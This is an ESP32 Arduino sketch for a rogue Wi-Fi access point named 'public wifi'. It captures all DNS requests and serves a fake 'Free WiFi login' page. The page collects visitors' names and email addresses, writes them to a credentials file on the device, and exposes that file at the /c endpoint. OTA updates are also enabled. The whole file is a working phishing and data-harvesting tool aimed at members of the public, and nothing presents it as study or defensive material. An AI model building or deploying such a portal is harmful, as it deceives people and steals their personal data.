#include <WiFi.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <AsyncElegantOTA.h>
#include "SPIFFS.h"

#define ADC_PIN 34
#define ADC_EN 14
const byte DNS_PORT = 53;
IPAddress apIP(8,8,4,4);
DNSServer dnsServer;
AsyncWebServer server(80);

int vref = 1100;
float battery_voltage = 0.0f;

// Declare getCredentials() early so it's accessible everywhere
String getCredentials() {
  String credentials;
  File file = SPIFFS.open("/credentials.txt", "r");
  if (!file) {
    credentials = "There was an error opening the credentials file.";
  } else {
    while (file.available()) {
      credentials += char(file.read());
    }
    file.close();
  }
  return credentials;
}

void setup() {
  Serial.begin(115200);
  
  if(!SPIFFS.begin(true)){
    Serial.println("An Error has occurred while mounting SPIFFS");
    return;
  }
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP("public wifi");
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));

  pinMode(ADC_EN, OUTPUT);
  digitalWrite(ADC_EN, HIGH);

  dnsServer.start(DNS_PORT, "*", apIP);

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
    uint16_t v = analogRead(ADC_PIN);
    battery_voltage = ((float)v / 4095.0) * 2.0 * 3.3 * (vref / 1000.0);
    
    String responseHTML = 
    "<!DOCTYPE html>"
    "<html>"
    "<head>"
    "<meta name='viewport' content='width=device-width, initial-scale=1'>"
    "<title>Free WiFi login</title>"
    "<style>"
    "body {"
      "display: flex;"
      "justify-content: center;"
      "align-items: center;"
      "min-height: 100vh;"
      "font-family: Arial, sans-serif;"
      "background-color: #333;"
      "color: #EEE;"
      "position: relative;"
    "}"
    ".card {"
      "background: #444;"
      "border-radius: 20px;"
      "padding: 20px;"
      "margin: 10px;"
      "width: 200px;"
      "text-align: center;"
    "}"
    "input {"
      "margin-top: 10px;"
      "width: 100%;"
      "padding: 10px;"
      "border: none;"
      "border-radius: 5px;"
    "}"
    "input[type=submit] {"
      "background-color: #555;"
      "color: #EEE;"
    "}"
    ".battery {"
      "position: absolute;"
      "bottom: 10px;"
      "left: 10px;"
    "}"
    "</style>"
    "</head>"
    "<body>"
    "<div class='card'>"
    "<h2>Free Wifi</h2>"
      "<form action='/login' method='POST'>"
        "<input type='email' placeholder='Email' name='email' required>"
        "<br>"
        "<input type='text' placeholder='Name' name='name' required>"
        "<br>"
        "<input type='submit' value='Login'>"
      "</form>"
    "</div>"
    "<div class='battery'>Battery Voltage: " + String(battery_voltage) + "V</div>"
    "</body>"
    "</html>";
        
    request->send(200, "text/html", responseHTML);
  });

  server.on("/c", HTTP_GET, [](AsyncWebServerRequest *request){
    String credentials = getCredentials();
    request->send(200, "text/plain", credentials);
  });

  server.on("/login", HTTP_POST, [](AsyncWebServerRequest* request) {
    int params = request->params();
    String name, email;
    for (int i = 0; i < params; i++) {
      AsyncWebParameter* p = request->getParam(i);
      if (p->name() == "name") {
        name = p->value();
      }
      if (p->name() == "email") {
        email = p->value();
      }
    }
    File file = SPIFFS.open("/credentials.txt", "a");
    if (!file) {
      Serial.println("Failed to open file for appending");
      return request->send(500, "text/plain", "File operation failed");
    }
    file.println("Name: " + name);
    file.println("Email: " + email);
    file.close();
    request->redirect("/");
  });

  server.onNotFound([](AsyncWebServerRequest *request){
    request->redirect("/");
  });

  AsyncElegantOTA.begin(&server);    // Start OTA
  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  AsyncElegantOTA.loop();
}

// Print stored credentials from SPIFFS
